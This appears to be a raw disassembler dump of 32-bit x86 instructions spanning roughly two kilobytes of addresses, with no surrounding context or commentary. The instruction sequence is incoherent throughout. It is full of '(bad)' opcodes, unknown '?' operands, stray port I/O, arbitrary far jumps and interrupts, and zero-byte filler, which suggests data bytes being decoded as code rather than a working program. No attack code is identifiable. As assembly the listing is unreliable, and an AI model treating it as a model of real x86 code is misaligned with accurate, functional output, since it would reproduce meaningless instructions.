  422006:	mov    DWORD PTR [ebx+0x498284e9],esi
  42200c:	nop
  42200d:	push   ss
  42200e:	cld    
  42200f:	and    eax,0x750000d4
  422014:	cdq    
  422015:	test   BYTE PTR [edx+0x19640219],bh
  42201b:	mov    eax,ds:0x982c297b
  422020:	adc    DWORD PTR [ebp+0x19],0x41110f45
  422027:	jns    0x421faf
  422029:	daa    
  42202a:	add    al,0x75
  42202c:	add    ch,BYTE PTR [edx+0x1c]
  42202f:	jns    0x422030
  422031:	push   0x5c
  422033:	jb     0x422044
  422035:	out    0xad,al
  422037:	aam    0x7d
  422039:	fwait
  42203a:	aas    
  42203b:	retf   0x9b79
  42203e:	daa    
  42203f:	push   edx
  422040:	push   esi
  422041:	xchg   ebx,eax
  422042:	add    esi,DWORD PTR [ebp+0x7d]
  422045:	mov    ds:0x1b,eax
  42204a:	add    BYTE PTR [eax],al
  42204c:	mov    edx,0xefb0e79c
  422051:	test   BYTE PTR [edx+0x18],dh
  422054:	cmp    DWORD PTR [edi],ecx
  422056:	xchg   esi,eax
  422057:	mov    ah,0xfb
  422059:	lods   al,BYTE PTR ds:[esi]
  42205a:	out    dx,al
  42205b:	mov    ch,BYTE PTR [edi+0x56eee516]
  422061:	repnz es add al,0xf6
  422065:	inc    ecx
  422066:	pop    ebx
  422067:	lock inc esp
  42206a:	shl    BYTE PTR [ebx-0x4c53845f],cl
  422070:	out    dx,eax
  422071:	mov    WORD PTR [esi-0x4a7cc4d5],?
  422077:	sbb    BYTE PTR [ebp-0xbfb3ef1],ah
  42207d:	cmp    DWORD PTR [ebp+0x6912378a],esp
  422083:	sbb    ebx,ecx
  422085:	xchg   esp,eax
  422086:	imul   BYTE PTR [ebp+0x14237d7a]
  42208c:	and    DWORD PTR [edx-0x77d117b],esi
  422092:	es add al,0xf4
  422095:	inc    ebp
  422096:	jmp    esp
  422098:	loopne 0x422046
  42209a:	mov    dh,ah
  42209c:	sbb    dh,BYTE PTR [edi+0xf0bc2e7]
  4220a2:	cld    
  4220a3:	jb     0x4220d9
  4220a5:	mov    BYTE PTR [edx+0x51],al
  4220a8:	sti    
  4220a9:	ret    
  4220aa:	out    0x60,eax
  4220ac:	retf   
  4220ad:	mov    ch,BYTE PTR ds:[eax+eax*1+0x0]
  4220b2:	add    BYTE PTR [eax],al
  4220b4:	add    dl,bl
  4220b6:	or     edi,esp
  4220b8:	ds out dx,eax
  4220ba:	ret    
  4220bb:	shl    DWORD PTR [ebx+esi*1+0x16],cl
  4220bf:	xchg   BYTE PTR [edx+eiz*4-0x746a7d88],ah
  4220c6:	push   cs
  4220c7:	cld    
  4220c8:	mov    ecx,0x2ecfb8f3
  4220cd:	adc    esi,DWORD PTR [esi]
  4220cf:	add    ch,cl
  4220d1:	jbe    0x4220d5
  4220d3:	lds    ebp,FWORD PTR [esi+edx*4+0x76e9fc0c]
  4220da:	inc    edi
  4220db:	inc    edx
  4220dc:	or     eax,0xe9000278
  4220e1:	pop    esi
  4220e2:	pop    esp
  4220e3:	scas   al,BYTE PTR es:[edi]
  4220e4:	jmp    0xcd9c9c5f
  4220e9:	inc    esi
  4220ea:	dec    esi
  4220eb:	aaa    
  4220ec:	sub    al,0x81
  4220ee:	call   DWORD PTR [edx+0x634df6a9]
  4220f4:	shl    DWORD PTR [edx-0x3d4103ed],1
  4220fa:	scas   eax,DWORD PTR es:[edi]
  4220fb:	pop    eax
  4220fc:	mov    al,ds:0xb7000137
  422101:	mov    ch,0xe1
  422103:	add    ebp,eax
  422105:	adc    BYTE PTR [ebx-0x12],bh
  422108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422109:	fisttp DWORD PTR [ebp+0x72]
  42210c:	sub    DWORD PTR [ecx-0x6a],edi
  42210f:	add    eax,0x9b299937
  422114:	add    dl,bh
  422116:	cmc    
  422117:	xchg   esi,eax
  422119:	add    BYTE PTR [eax],al
  42211b:	add    BYTE PTR [eax],al
  42211d:	add    BYTE PTR [edx-0x40],bl
  422120:	add    BYTE PTR [eax],al
  422122:	xchg   ecx,eax
  422123:	jns    0x42210d
  422125:	sub    DWORD PTR [eax],0x8cfffe7a
  42212b:	push   eax
  42212c:	push   edx
  42212d:	push   edi
  42212e:	(bad)  
  42212f:	push   edx
  422130:	mov    DWORD PTR [ebp+0x1c],esi
  422133:	dec    esi
  422134:	in     al,0xd0
  422136:	mov    eax,0x42330001
  42213b:	pop    esp
  42213c:	mov    DWORD PTR [ebp+0xc],eax
  42213f:	push   esi
  422140:	mov    DWORD PTR [ebp-0x415dc],edi
  422146:	in     al,0x0
  422148:	add    BYTE PTR [eax],al
  42214a:	int3   
  42214b:	(bad)  
  42214d:	cmp    BYTE PTR [ebx-0xb],0x7f
  422151:	clc    
  422152:	imul   eax,DWORD PTR ds:0x15e0b84,0x0
  422159:	cmp    edx,DWORD PTR [edx+0x4e038405]
  42215f:	add    DWORD PTR [eax],eax
  422161:	mov    esp,DWORD PTR [ebx+0x56]
  422164:	sti    
  422165:	adc    eax,0x3c1604
  42216a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42216b:	inc    edx
  42216c:	int3   
  42216d:	cmp    edx,edx
  42216f:	add    eax,DWORD PTR [edi+ebp*8+0x6a00011d]
  422176:	inc    edx
  422177:	jnp    0x4221f2
  422179:	les    edx,FWORD PTR [esi+ebx*8+0x4f]
  42217d:	jl     0x42218b
  42217f:	add    DWORD PTR [edi+0xc7],eax
  422185:	add    BYTE PTR [eax],al
  422187:	mov    ebp,?
  422189:	jno    0x42215b
  42218b:	sbb    edx,DWORD PTR [edx]
  42218d:	mov    esp,0x37068c12
  422192:	(bad)  
  422193:	retf   
  422194:	mov    ebx,es
  422196:	add    DWORD PTR [ebp+0x1b],esi
  422199:	add    BYTE PTR [esi+0x23],dl
  42219c:	scas   al,BYTE PTR es:[edi]
  42219d:	(bad)  
  42219e:	sti    
  42219f:	and    al,0x96
  4221a1:	(bad)  
  4221a2:	fbld   TBYTE PTR [esp+ecx*4]
  4221a5:	xor    BYTE PTR [edx-0x4f80dc4b],al
  4221ab:	je     0x4221c8
  4221ad:	add    BYTE PTR [ecx+0x789bb38],cl
  4221b3:	call   0x935a0d
  4221b8:	dec    esi
  4221b9:	inc    esp
  4221ba:	push   ecx
  4221bb:	and    eax,0x82f78fa2
  4221c0:	imul   ebx,DWORD PTR [edx+eax*4+0x797f1bb5],0x89001974
  4221cb:	mov    al,0xb9
  4221cd:	mov    DWORD PTR [edi],eax
  4221cf:	lock dec esi
  4221d1:	sub    al,0x51
  4221d3:	call   0xdf93622e
  4221d8:	or     DWORD PTR [edx+0x15d1c0fc],ebp
  4221de:	jb     0x422211
  4221e0:	push   0x15
  4221e2:	dec    esi
  4221e3:	jge    0x42218b
  4221e5:	inc    eax
  4221e6:	or     al,0xf8
  4221e8:	add    eax,DWORD PTR gs:[eax]
  4221eb:	add    BYTE PTR [eax],al
  4221ed:	add    BYTE PTR [eax],al
  4221ef:	add    BYTE PTR [ebp-0x68],dh
  4221f2:	xchg   edi,eax
  4221f3:	mov    edi,0x367d1479
  4221f8:	je     0x422213
  4221fa:	add    BYTE PTR [ecx+0x7864db8],cl
  422200:	clc    
  422201:	(bad)  
  422202:	sub    edx,DWORD PTR [ecx-0x73]
  422205:	sbb    DWORD PTR [eax],eax
  422207:	and    BYTE PTR [ebp-0x17],dh
  42220a:	adc    cl,BYTE PTR [esi-0x53]
  42220d:	sahf   
  42220e:	inc    ebx
  42220f:	or     al,0xf0
  422211:	cmp    al,0x1
  422213:	add    BYTE PTR [ebp+0x2],dh
  422216:	jb     0x4221d7
  422218:	shl    BYTE PTR [edi-0x12],cl
  42221b:	xchg   BYTE PTR [edi],ah
  42221d:	cmp    bh,BYTE PTR [eax]
  42221f:	scas   al,BYTE PTR es:[edi]
  422220:	cmp    cl,BYTE PTR [ebx]
  422222:	aaa    
  422223:	loopne 0x42221c
  422225:	inc    edx
  422226:	cmc    
  422227:	jle    0x4221e3
  422229:	add    ah,bh
  42222b:	add    edi,esp
  42222d:	lds    edi,FWORD PTR [esi-0x77]
  422230:	jb     0x4222af
  422232:	adc    edi,DWORD PTR [eax]
  422234:	inc    esp
  422235:	mov    ah,0x65
  422237:	(bad)  
  422238:	mov    dl,0xb2
  42223a:	pop    ebp
  42223b:	mov    bl,0x3e
  42223d:	test   DWORD PTR [esi],esp
  42223f:	add    eax,0x3e623f6
  422244:	jne    0x4222bd
  422246:	stos   DWORD PTR es:[edi],eax
  422247:	aaa    
  422248:	repz xchg ebp,eax
  42224a:	(bad)  ss:[edx+0x6a456cfb]
  422251:	or     esp,esi
  422253:	mov    al,BYTE PTR [eax]
  422255:	add    BYTE PTR [eax],al
  422257:	add    BYTE PTR [eax],al
  422259:	out    0x26,eax
  42225b:	jno    0x422224
  42225d:	push   esi
  42225e:	jge    0x4221fa
  422260:	add    bh,BYTE PTR [ecx+0x79]
  422263:	fwait
  422264:	jae    0xfb4704fd
  42226a:	imul   esp,esi,0x73797503
  422270:	daa    
  422271:	std    
  422272:	ret    0xde
  422275:	mov    dh,0x1e
  422277:	mov    eax,0x67f9ed38
  42227c:	sub    bh,BYTE PTR [eax+0x2]
  42227f:	jmp    0x9f8f:0x1fe186d3
  422286:	ja     0x4222be
  422288:	or     al,0xec
  42228a:	aas    
  42228b:	into   
  42228c:	push   eax
  42228d:	enter  0xbd0b,0x7e
  422291:	xor    dl,BYTE PTR [esi-0x7dd8ea01]
  422297:	(bad)  
  422298:	scas   al,BYTE PTR es:[edi]
  422299:	sti    
  42229a:	mov    bh,0xf7
  42229c:	xchg   ecx,eax
  42229d:	out    dx,al
  42229e:	gs std 
  4222a0:	sahf   
  4222a1:	cld    
  4222a2:	xor    ch,al
  4222a4:	fdivp  st(5),st
  4222a6:	call   0x91c5:0x79b65b07
  4222ad:	loope  0x42230b
  4222af:	std    
  4222b0:	jle    0x4222e5
  4222b2:	dec    ebx
  4222b3:	jae    0x422269
  4222b5:	fcomp  DWORD PTR [eax+0xe2e69ff]
  4222bb:	out    0xac,eax
  4222bd:	add    BYTE PTR [eax],al
  4222bf:	add    BYTE PTR [eax],al
  4222c1:	add    BYTE PTR [ebx],bh
  4222c3:	or     eax,0x806672fc
  4222c8:	cmc    
  4222c9:	fnsave [eax-0x4c]
  4222cc:	and    BYTE PTR [ecx],0x69
  4222cf:	js     0x42231b
  4222d1:	inc    ecx
  4222d2:	dec    esi
  4222d3:	mov    dh,0xa4
  4222d5:	aas    
  4222d6:	mov    DWORD PTR [ebx-0x29],edi
  4222d9:	lahf   
  4222da:	sahf   
  4222db:	fstp   DWORD PTR [eax-0xa2d76d1]
  4222e1:	ins    DWORD PTR es:[edi],dx
  4222e2:	popf   
  4222e3:	xchg   ebp,eax
  4222e4:	adc    ebx,edx
  4222e6:	mov    dh,0xa1
  4222e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222e9:	nop
  4222ea:	or     bh,BYTE PTR ss:[esp+ebx*2]
  4222ee:	cmp    edx,DWORD PTR [edx]
  4222f0:	out    0xc0,eax
  4222f2:	cdq    
  4222f3:	pop    es
  4222f4:	cld    
  4222f5:	adc    dh,BYTE PTR [ebx+edx*8-0xb]
  4222f9:	imul   al
  4222fb:	adc    eax,0x8272a488
  422300:	inc    edx
  422301:	aad    0x21
  422303:	retf   
  422304:	inc    esp
  422305:	in     eax,0x77
  422307:	test   BYTE PTR [eax-0x2a],ch
  42230a:	pushw  es
  42230c:	mov    BYTE PTR [eiz*2+0x4007406],ah
  422313:	mov    DWORD PTR [eax+edx*2],eax
  422316:	xor    edx,DWORD PTR [eax+0x14]
  422319:	call   FWORD PTR [ecx-0xfba7812]
  42231f:	mov    DWORD PTR [ecx-0x10],ecx
  422322:	dec    edi
  422323:	cmp    esp,eax
  422325:	or     al,0x0
  422327:	add    BYTE PTR [eax],al
  422329:	add    BYTE PTR [eax],al
  42232b:	xlat   BYTE PTR ds:[ebx]
  42232c:	or     eax,0xf4a8820b
  422331:	sti    
  422332:	call   DWORD PTR [edi+0x43]
  422335:	clc    
  422336:	mov    ebx,DWORD PTR [ebp-0x7100b2ab]
  42233c:	push   ss
  42233d:	xchg   DWORD PTR [ebp-0xc],eax
  422340:	mov    DWORD PTR [eax+edx*2],eax
  422343:	adc    ecx,DWORD PTR [edi+0x4]
  422346:	mov    ecx,ecx
  422348:	rol    DWORD PTR [edi+0x4df4cc08],1
  42234e:	or     BYTE PTR [edi],dl
  422350:	cmp    edi,eax
  422352:	jmp    FWORD PTR [ecx-0x23f77823]
  422358:	hlt    
  422359:	dec    ebp
  42235a:	sbb    bh,ah
  42235c:	cmp    ebx,esp
  42235e:	mov    edx,DWORD PTR [ebp+edx*2-0x5]
  422362:	push   ecx
  422363:	push   esp
  422364:	mov    BYTE PTR [ecx-0x4],al
  422367:	out    0x6,eax
  422369:	dec    esp
  42236a:	dec    DWORD PTR ds:0x645d870d
  422370:	push   0x59745850
  422375:	in     al,dx
  422376:	push   DWORD PTR [ebx-0xb]
  422379:	jno    0x42234b
  42237b:	xor    ecx,DWORD PTR [edx]
  42237d:	pop    eax
  42237e:	adc    bl,ah
  422380:	add    al,0x5b
  422382:	pop    esi
  422383:	pop    es
  422384:	(bad)  
  422385:	mov    edi,0x7de9a755
  42238a:	in     al,dx
  42238b:	fdivr  st,st(5)
  42238d:	(bad)  
  42238e:	inc    DWORD PTR [eax]
  422390:	add    BYTE PTR [eax],al
  422392:	add    BYTE PTR [eax],al
  422394:	jne    0x422362
  422396:	mov    ecx,0xf8fb8d54
  42239b:	aas    
  42239c:	jne    0x422351
  42239e:	ret    
  42239f:	adc    al,0x35
  4223a1:	sbb    ebx,DWORD PTR [eax]
  4223a3:	cs iret 
  4223a5:	dec    edi
  4223a6:	adc    DWORD PTR [eax-0x20705e23],ecx
  4223ac:	lock pop edi
  4223ae:	add    DWORD PTR [ecx+edi*8+0x5f000019],eax
  4223b5:	sar    DWORD PTR [esi+0x72],cl
  4223b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223b9:	rcr    BYTE PTR [ebx],cl
  4223bb:	push   0x3f
  4223bd:	sbb    eax,DWORD PTR [eax]
  4223bf:	push   0x4c
  4223c1:	xchg   esi,eax
  4223c2:	xchg   edi,eax
  4223c3:	jecxz  0x422412
  4223c5:	and    DWORD PTR [edx+0x7d1b7579],0x4
  4223cc:	div    BYTE PTR ds:0xd8ffff14
  4223d2:	mov    bl,0x8a
  4223d4:	cmp    bl,cl
  4223d6:	mov    bl,0x54
  4223d8:	or     BYTE PTR [edx-0x4],0x82
  4223dc:	mov    ch,0xf
  4223de:	xchg   DWORD PTR [ebx+0x74],eax
  4223e1:	sbb    DWORD PTR [eax],eax
  4223e3:	mov    DWORD PTR [edx-0x62],esi
  4223e6:	mov    edi,0x1170c4f7
  4223eb:	dec    edi
  4223ec:	xchg   ebp,eax
  4223ed:	xchg   esi,eax
  4223ee:	inc    eax
  4223ef:	or     al,0xf8
  4223f1:	sub    eax,DWORD PTR [ebx]
  4223f3:	add    BYTE PTR [ebp-0x7d],dh
  4223f6:	stos   BYTE PTR es:[edi],al
  4223f7:	mov    al,BYTE PTR [eax]
  4223f9:	add    BYTE PTR [eax],al
  4223fb:	add    BYTE PTR [eax],al
  4223fd:	or     dl,al
  4223ff:	push   cs
  422400:	cld    
  422401:	cmp    ah,BYTE PTR [edx+0x18]
  422404:	es scas eax,DWORD PTR es:[edi]
  422406:	sbb    DWORD PTR [eax],eax
  422408:	mov    DWORD PTR [eax-0x3af885ef],esi
  42240e:	sbb    BYTE PTR [eax-0x1cfcf3f5],dh
  422414:	add    al,0x75
  422416:	add    ch,BYTE PTR [edi+esi*4+0x1e]
  42241a:	mov    ch,0x36
  42241c:	adc    DWORD PTR [ebx+0x694463ee],esi
  422422:	jge    0x4223f6
  422424:	add    al,0x75
  422426:	add    dh,BYTE PTR [edx-0x39]
  422429:	fidivr WORD PTR [ebx-0x22]
  42242c:	jle    0x422475
  42242e:	adc    bl,BYTE PTR [eax]
  422430:	pushf  
  422431:	mov    ch,bh
  422433:	es add al,0x25
  422436:	pop    es
  422437:	test   DWORD PTR [esi+0x3e6bf80a],0x49e607c2
  422441:	aaa    
  422442:	pop    es
  422443:	out    0x0,eax
  422445:	jmp    0x422404
  422447:	jge    0x4223fd
  422449:	(bad)  
  42244a:	jge    0x42248a
  42244c:	adc    ah,BYTE PTR [ecx+0x669e1607]
  422452:	stos   DWORD PTR es:[edi],eax
  422453:	jae    0x4224a4
  422455:	push   edx
  422456:	or     BYTE PTR [ebp+0x11],bl
  422459:	xchg   edx,eax
  42245a:	jmp    0xa9c336e2
  42245f:	scas   eax,DWORD PTR es:[edi]
  422460:	xchg   BYTE PTR [eax],al
  422462:	add    BYTE PTR [eax],al
  422464:	add    BYTE PTR [eax],al
  422466:	mov    edx,0x727a74f7
  42246b:	pop    es
  42246c:	out    0x7c,al
  42246e:	mov    bh,0x12
  422470:	shl    BYTE PTR [edi+0x1b9375bd],0xc4
  422477:	mov    bl,0x73
  422479:	ja     0x4224f5
  42247b:	pop    es
  42247c:	sbb    eax,0xe69ca411
  422481:	jl     0x4224ac
  422483:	mov    ah,0x5f
  422485:	scas   eax,DWORD PTR es:[edi]
  422486:	push   edx
  422487:	jnp    0x422477
  422489:	mov    bl,0x31
  42248b:	mov    cl,0xea
  42248d:	xchg   dl,ch
  42248f:	mov    edi,?
  422491:	xchg   esp,eax
  422492:	int3   
  422493:	cmp    DWORD PTR [edx-0x3f97a1f],0x78493e9
  42249d:	fisub  WORD PTR [ebp+0x6]
  4224a0:	jae    0x422493
  4224a2:	jne    0x4224f1
  4224a4:	mov    ah,cl
  4224a6:	gs push es
  4224a8:	cld    
  4224a9:	dec    edi
  4224aa:	clc    
  4224ab:	(bad)  
  4224ad:	xor    eax,0xebbf81e0
  4224b2:	jne    0x422501
  4224b4:	pop    es
  4224b5:	inc    edi
  4224b6:	repnz aas 
  4224b8:	jb     0x422450
  4224ba:	sbb    al,0x82
  4224bc:	aaa    
  4224bd:	sub    ebp,ebp
  4224bf:	add    BYTE PTR [ecx],dh
  4224c1:	test   eax,0xdb7346fb
  4224c6:	cmp    eax,DWORD PTR [edi+eax*1+0x86]
  4224cd:	add    BYTE PTR [eax],al
  4224cf:	test   DWORD PTR [esi],eax
  4224d1:	dec    edi
  4224d2:	push   0x6e
  4224d4:	push   es
  4224d5:	mov    ah,BYTE PTR [edi*2-0x7bbb92e1]
  4224dc:	push   es
  4224dd:	sub    DWORD PTR [ecx],0xffffffea
  4224e0:	jmp    0xa976:0x5eee2930
  4224e7:	jbe    0x4224ab
  4224e9:	mov    bl,BYTE PTR [edx+eiz*2-0x7b73a6e1]
  4224f0:	push   es
  4224f1:	call   0x795016e9
  4224f6:	mov    ebp,0xe8f7837b
  4224fb:	add    edi,edx
  4224fd:	std    
  4224fe:	lods   al,BYTE PTR ds:[esi]
  4224ff:	gs int 0x5a
  422502:	push   ds
  422503:	jne    0x422581
  422505:	inc    ebp
  422506:	push   ss
  422507:	gs push es
  422509:	mov    BYTE PTR [esi+eiz*2+0xc00077a],ah
  422510:	repz dec ebp
  422512:	or     BYTE PTR [edi-0x2e74238c],ah
  422518:	in     eax,0x87
  42251a:	or     ah,bh
  42251c:	repnz dec ebp
  42251e:	or     BYTE PTR [edi+0x48bf43b],al
  422524:	push   edx
  422525:	sti    
  422526:	push   ecx
  422527:	cld    
  422528:	jp     0x4224e6
  42252a:	mov    edx,DWORD PTR [ecx-0xa]
  42252d:	xchg   DWORD PTR [eax],ecx
  42252f:	jmp    0x4225ae
  422531:	jmp    0x0:0xfe
  422538:	sub    esi,esi
  42253a:	dec    esp
  42253b:	(bad)  
  42253c:	jge    0x422544
  42253e:	xchg   DWORD PTR [edi],eax
  422540:	xor    ebp,0x4c
  422543:	or     BYTE PTR [edi+0x53],al
  422546:	lock push 0xffffff83
  422549:	push   esi
  42254a:	in     al,0xa1
  42254c:	cli    
  42254d:	cmc    
  42254e:	sti    
  42254f:	pop    edi
  422550:	mov    bl,BYTE PTR [ecx-0x3b]
  422553:	ret    
  422554:	(bad)  
  422555:	out    0xe0,al
  422557:	(bad)  
  422558:	sub    esi,ebp
  42255a:	cmp    BYTE PTR [esi+ebx*4],al
  42255d:	pop    es
  42255e:	data16 add ah,dh
  422561:	mov    bh,0xf6
  422563:	call   FWORD PTR [ebx]
  422565:	out    0x35,al
  422567:	(bad)  
  422568:	sub    esi,ebp
  42256a:	out    0xa,eax
  42256c:	xor    al,0x43
  42256e:	lock jmp FWORD PTR [ebx]
  422571:	out    0xe2,al
  422573:	sti    
  422574:	mov    ebx,0xae47e4f5
  422579:	cmc    
  42257a:	sti    
  42257b:	push   0x4d
  42257d:	jmp    0xf5ce201a
  422582:	push   ebp
  422583:	ret    
  422584:	adc    ecx,DWORD PTR [eax+0x6a8e85f4]
  42258a:	and    eax,0x1a4750f
  42258f:	data16 lock ficom DWORD PTR [edi-0x2bfd09e2]
  422597:	jb     0x422519
  422599:	adc    al,0x55
  42259b:	inc    ecx
  42259c:	add    BYTE PTR [eax],al
  42259e:	add    BYTE PTR [eax],al
  4225a0:	add    BYTE PTR [edi-0x68],dh
  4225a3:	or     esi,DWORD PTR [edi-0x5f]
  4225a6:	push   ds
  4225a7:	xor    edi,0xe804a6ad
  4225ad:	loope  0x4225f8
  4225af:	or     eax,0x1858a2fc
  4225b4:	or     DWORD PTR [ebp+0x1b],esi
  4225b7:	add    BYTE PTR [ebp-0x4a],bl
  4225ba:	xchg   edi,eax
  4225bb:	in     eax,0xff
  4225bd:	pop    esp
  4225be:	adc    ebp,DWORD PTR [eax-0x2f1b49a4]
  4225c4:	cmc    
  4225c5:	sahf   
  4225c6:	ins    DWORD PTR es:[edi],dx
  4225c7:	xchg   esp,eax
  4225c8:	inc    ebp
  4225c9:	and    BYTE PTR [esi+esi*8-0x6baa719b],0x3d
  4225d1:	xchg   BYTE PTR [ebx-0x7f],bl
  4225d4:	test   BYTE PTR [eax+0x776a06ee],0xe3
  4225db:	sbb    BYTE PTR [esi+esi*8],dl
  4225de:	sbb    ecx,0xf0808872
  4225e4:	not    BYTE PTR gs:[ecx+0x306874cb]
  4225eb:	adc    cl,BYTE PTR [ecx]
  4225ed:	jp     0x42265b
  4225ef:	cmp    ecx,DWORD PTR [edx-0x7fcfe2f7]
  4225f5:	mov    bh,0x18
  4225f7:	std    
  4225f8:	mov    ah,0x7f
  4225fa:	cwde   
  4225fb:	or     ebp,DWORD PTR [edi]
  4225fd:	out    0xbe,al
  4225ff:	mov    ds:0x1462c82,al
  422604:	add    DWORD PTR [eax],0x0
  42260a:	sub    eax,0xc901581b
  42260f:	add    ch,dh
  422611:	push   ss
  422612:	sub    BYTE PTR [eax],bl
  422614:	jmp    0x5feca0b2
  422619:	(bad)  
  42261a:	cwde   
  42261b:	aas    
  42261c:	mov    bl,0x7a
  42261e:	push   ds
  42261f:	mov    al,0x9d
  422621:	jp     0x422653
  422623:	sbb    esi,DWORD PTR [ebx+eax*1+0x75]
  422627:	add    bh,bh
  422629:	jmp    0x4226a1
  42262b:	add    ah,bh
  42262d:	shr    BYTE PTR ds:0x9b139b0,cl
  422633:	mov    ?,esi
  422635:	js     0x422641
  422637:	lods   al,BYTE PTR ds:[esi]
  422638:	aad    0xf7
  42263a:	out    0xed,al
  42263c:	es add al,0x48
  42263f:	jns    0x42262d
  422641:	sbb    esp,edx
  422643:	imul   edi,DWORD PTR [ebp+ecx*1+0x83be4ab],0xffffffa7
  42264b:	inc    edx
  42264c:	sar    DWORD PTR [edx-0x3bf284ef],0xca
  422653:	cmp    al,0x23
  422655:	hlt    
  422656:	jbe    0x42265a
  422658:	out    0x3,eax
  42265a:	dec    edi
  42265b:	(bad)  
  42265c:	pop    ebx
  42265d:	lds    esi,FWORD PTR [esi-0x4e]
  422660:	test   ebp,edx
  422662:	test   eax,0x2af77dcc
  422667:	in     eax,dx
  422668:	es add al,0xf4
  42266b:	cmp    ebx,esi
  42266d:	or     al,0x0
  42266f:	add    BYTE PTR [eax],al
  422671:	add    BYTE PTR [eax],al
  422673:	aas    
  422674:	repnz fistp DWORD PTR [ebx]
  422677:	and    eax,0x2400d0af
  42267c:	scas   eax,DWORD PTR es:[edi]
  42267d:	push   ebp
  42267e:	xchg   edi,eax
  42267f:	outs   dx,BYTE PTR ds:[esi]
  422680:	add    edx,ebx
  422682:	sti    
  422683:	jno    0x422651
  422685:	inc    ebp
  422686:	not    DWORD PTR [edx]
  422688:	in     eax,dx
  422689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42268a:	add    edi,edx
  42268c:	mov    ebx,0x422decff
  422691:	jb     0x422673
  422693:	int    0x3d
  422695:	out    0xf3,eax
  422697:	jbe    0x42269b
  422699:	add    BYTE PTR [edx],dl
  42269b:	popf   
  42269c:	push   ebx
  42269d:	(bad)  
  42269e:	mov    ch,0xd
  4226a0:	test   al,0xc1
  4226a2:	fnsave [esi-0x54]
  4226a5:	push   esp
  4226a6:	jb     0x422629
  4226a8:	sbb    esp,DWORD PTR [eax]
  4226aa:	jmp    0xafcb2925
  4226af:	jb     0x42272a
  4226b1:	cmp    bl,BYTE PTR [ecx+0xa]
  4226b4:	ret    
  4226b5:	jmp    FWORD PTR [ebx-0x4a]
  4226b8:	pop    DWORD PTR [ecx+edi*1]
  4226bb:	jo     0x4226eb
  4226bd:	or     BYTE PTR [edi+0x6d],0x2
  4226c1:	mov    edi,esp
  4226c3:	sti    
  4226c4:	inc    edx
  4226c5:	jae    0x4226b6
  4226c7:	es push es
  4226c9:	aam    0x6a
  4226cb:	fadd   DWORD PTR [edx]
  4226cd:	pop    ebp
  4226ce:	pop    ss
  4226cf:	xor    al,0x7a
  4226d1:	inc    ebp
  4226d2:	loope  0x4226cf
  4226d4:	inc    edx
  4226d5:	jae    0x4226c9
  4226d7:	add    BYTE PTR [eax],al
  4226d9:	add    BYTE PTR [eax],al
  4226db:	add    BYTE PTR [esi],al
  4226dd:	push   es
  4226de:	adc    bh,BYTE PTR [ecx-0x35]
  4226e1:	ret    0x69ff
  4226e4:	adc    bl,bh
  4226e6:	jmp    FWORD PTR [ecx+0x68eb79eb]
  4226ec:	mov    ch,bl
  4226ee:	(bad)  
  4226ef:	call   0x6097d86a
  4226f4:	mov    bl,0x6
  4226f6:	add    BYTE PTR [eiz*2+0x67725501],0x4a
  4226fe:	call   FWORD PTR [ebp-0x7e]
  422701:	jle    0x422776
  422703:	in     al,dx
  422704:	sub    eax,0xfa9dfd03
  422709:	test   eax,0x8280004
  42270e:	jnp    0x4226db
  422710:	dec    esp
  422711:	push   es
  422712:	add    BYTE PTR [eax],0xe3
  422715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422716:	outs   dx,BYTE PTR ds:[esi]
  422717:	inc    eax
  422718:	pop    esp
  422719:	pop    esi
  42271a:	cli    
  42271b:	je     0x422776
  42271d:	dec    edi
  42271e:	arpl   WORD PTR [ebp+0xc],si
  422721:	push   es
  422722:	call   0xfc508ad6
  422727:	push   0x1c
  422729:	mov    bl,0x63
  42272b:	nop
  42272c:	pop    ebx
  42272d:	ret    0x69fb
  422730:	or     al,0x9e
  422732:	dec    edi
  422733:	jne    0x422701
  422735:	add    eax,0xb71475fd
  42273a:	cld    
  42273b:	jbe    0x422755
  42273d:	or     eax,0xa00e
  422742:	add    BYTE PTR [eax],al
  422744:	add    BYTE PTR [ecx],cl
  422746:	(bad)  
  422747:	sti    
  422748:	mov    BYTE PTR [edx-0x2],cl
  42274b:	jle    0x42270d
  42274d:	rol    DWORD PTR [ecx+0x5dc00ea],cl
  422753:	data16 add al,0x51
  422756:	mov    ebx,0xbb365103
  42275b:	dec    ebx
  42275c:	(bad)  
  42275d:	cdq    
  42275e:	(bad)  
  42275f:	cli    
  422760:	(bad)  
  422761:	fadd   QWORD PTR ds:0xf39415fd
  422767:	cmp    eax,DWORD PTR [eax]
  422769:	hlt    
  42276a:	sbb    edi,DWORD PTR [edi+0x368203ff]
  422770:	pushf  
  422771:	leave  
  422772:	(bad)  
  422775:	mov    WORD PTR ds:0x1e0a000,es
  42277b:	outs   dx,DWORD PTR ds:[esi]
  42277c:	or     eax,0xffbeebf4
  422781:	adc    eax,DWORD PTR [edx-0x7ce7f045]
  422787:	sti    
  422788:	push   DWORD PTR [ebp-0x15]
  42278b:	js     0x4227cf
  42278d:	jge    0x42274a
  42278f:	js     0x422713
  422791:	ins    BYTE PTR es:[edi],dx
  422792:	dec    ecx
  422793:	pop    es
  422794:	cld    
  422795:	lds    ebp,FWORD PTR [eax]
  422797:	rol    DWORD PTR [edi],0x75
  42279a:	jmp    0x1077:0xd652ffff
  4227a1:	mov    ch,0xeb
  4227a3:	cmp    BYTE PTR [edi-0x3b86d38],0x0
  4227aa:	add    BYTE PTR [eax],al
  4227ac:	add    BYTE PTR [eax],al
  4227ae:	jne    0x42279b
  4227b0:	push   DWORD PTR [esi]
  4227b2:	mov    eax,0xb041f6e3
  4227b7:	repz inc ecx
  4227b9:	cmp    DWORD PTR [eax+0x2],0x6
  4227bd:	cld    
  4227be:	sbb    ch,bl
  4227c0:	js     0x422744
  4227c2:	or     al,0xf1
  4227c4:	push   es
  4227c5:	cld    
  4227c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c7:	call   0x2baa13bc
  4227cc:	add    al,0x87
  4227ce:	mov    al,0xe3
  4227d0:	cmp    BYTE PTR [edi+0xe9a2a69],0xf8
  4227d7:	ins    DWORD PTR es:[edi],dx
  4227d8:	pop    ss
  4227d9:	std    
  4227da:	loop   0x42279b
  4227dc:	xchg   edi,eax
  4227dd:	mov    edi,0x50042b5c
  4227e2:	rcl    ch,cl
